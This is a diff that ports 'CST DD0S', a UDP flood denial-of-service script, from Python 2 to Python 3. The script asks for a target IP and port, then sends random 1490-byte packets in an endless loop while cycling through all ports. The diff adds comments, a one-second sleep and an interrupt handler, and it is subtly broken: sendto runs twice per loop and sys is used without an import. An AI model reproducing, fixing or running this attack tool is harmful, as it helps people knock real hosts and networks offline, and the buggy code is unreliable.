@@ -3,7 +3,8 @@ import os
 import time
 import socket
 import random
-#Code Time
+
+# Code Time
 from datetime import datetime
 now = datetime.now()
 hour = now.hour
@@ -12,39 +13,49 @@ day = now.day
 month = now.month
 year = now.year
 
-##############
+# Create a socket
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+# Generate random bytes
 bytes = random._urandom(1490)
-#############
 
+# Clear the screen and display information
 os.system("clear")
-os.system("CST DD0S")
-print
-print "Recode   : rius"
-print "You Tube : @riusz7"
-print "Github   :  github.com/rius-admin"
-print "Stop : CTRL + C"
-print
-ip = raw_input("IP Target : ")
-port = input("Port       : ")
+print("""
+Recode   : rius
+You Tube : @riusz7
+Github   :  github.com/rius-admin
+Stop : CTRL + C
+""")
 
+# Get the target IP and port from the user
+ip = input("IP Target : ")
+port = int(input("Port       : "))
+
+# Clear the screen and display the CST DD0S ASCII art
 os.system("clear")
 os.system("figlet CST DD0S")
-print "[                    ] 0% "
-time.sleep(5)
-print "[ ═━━━━━━━━━━          ] 25%"
-time.sleep(5)
-print "[ ══════━━━━━       ] 50%"
-time.sleep(5)
-print "[  ══════════━       ] 75%"
-time.sleep(5)
-print "[ go ] 100%"
-time.sleep(3)
-sent = 0
+
+# Send packets indefinitely
 while True:
-     sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
-     if port == 65535:
-       port = 1
+    try:
+        # Send a packet to the target IP and port
+        sock.sendto(bytes, (ip, port))
+        
+        # Print the number of packets sent
+        print("Sent packet %d to %s throught port:%d" % (sock.sendto(bytes, (ip, port)), ip, port))
+        
+        # Sleep for a second to prevent flooding the target
+        time.sleep(1)
+        
+        # Increment the port number
+        port += 1
+        
+        # If the port number reaches 65535, start from port 1 again
+        if port == 65535:
+            port = 1
+    
+    # Handle CTRL + C interruption
+    except KeyboardInterrupt:
+        print("\nStopping...")
+        sys.exit()
